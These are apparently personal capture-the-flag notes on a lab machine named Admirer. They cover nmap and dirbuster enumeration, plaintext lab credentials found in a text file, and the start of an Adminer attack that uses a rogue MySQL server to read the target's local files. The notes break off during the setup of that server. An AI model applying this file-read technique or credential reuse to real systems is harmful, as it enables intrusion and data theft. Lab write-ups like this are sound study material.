 10.10.10.187 

nmap -sC -Pn -v 10.10.10.187

Nmap scan report for admirer.htb (10.10.10.187)
Host is up (0.22s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-title: Admirer



website shows art pieces

leonardo da vinci
nikola tesla
banksy
Johann Sebastian Bach
particle accelerator


found in website source

<div>
    <section>
        <h2>Get in touch</h2>
        <form method="post" action="#"><!-- Still under development... This does not send anything yet, but it looks nice! -->
            <div class="fields">
                <div class="field half">
                    <input type="text" name="name" id="name" placeholder="Name" />
                </div>
                <div class="field half">
                    <input type="text" name="email" id="email" placeholder="Email" />
                </div>
                <div class="field">
                    <textarea name="message" id="message" rows="4" placeholder="Message"></textarea>
                </div>
            </div>
            <ul class="actions">
                <li><input type="submit" value="Send" class="primary" /></li>
                <li><input type="reset" value="Reset" /></li>
            </ul>
        </form>
    </section>
</div>




began running dirbuster


http://10.10.10.187/robots.txt

User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir

not allowed to access admin-dir
di

apache version 2.4.25


https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt


run dirbuster with seclists/discovery/common.txt    

used dirbuster, aimed at directory of http://10.10.10.187/admin-dir and searched for .txt extension files


Starting dir/file list based brute forcing
Dir found: /admin-dir/ - 403
File found: /admin-dir/contacts.txt - 200
DirBuster Stopped


sqlmap does not return anything to be injected and scripted


Credentials.txt

```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuserx
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```



sql database is `admirerdb`

-- Server version	10.1.41-MariaDB-0+deb9u1



use dirbuster again for http://10.10.10.187/utility-scripts/ with seclists/discovery/web_content/big.txt


found http://10.10.10.187/utility-scripts/adminer.php

attempted login with waldo and password from admin_tasks.php, does not work

googling adminer vuln


https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool
 BIG VULNERABILITY FOUND

 https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f

 ```
    Setting up MySQL server within public IP address
    Connecting adminer to the MySQL server (now user has logged to adminer)
    Reading local files by read data local infile command, inserting the results in a table
 ```


create mysql server on my side

/usr/bin/mysql -u root -p
CREATE DATABASE exploit;
CREATE USER 'exploit'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON * . * TO 'exploit'@'localhost';
FLUSH PRIVILEGES;
use exploit
create table exploit(data varchar(250));


CREATE DATABASE admirer;
CREATE USER ‘demo’@’%’ IDENTIFIED BY ‘demo_admirer’;
GRANT ALL PRIVILEGES ON * . * TO ‘demo’@’%’;
FLUSH PRIVILEGES;
USE admirer;
create table test(data VARCHAR(255));


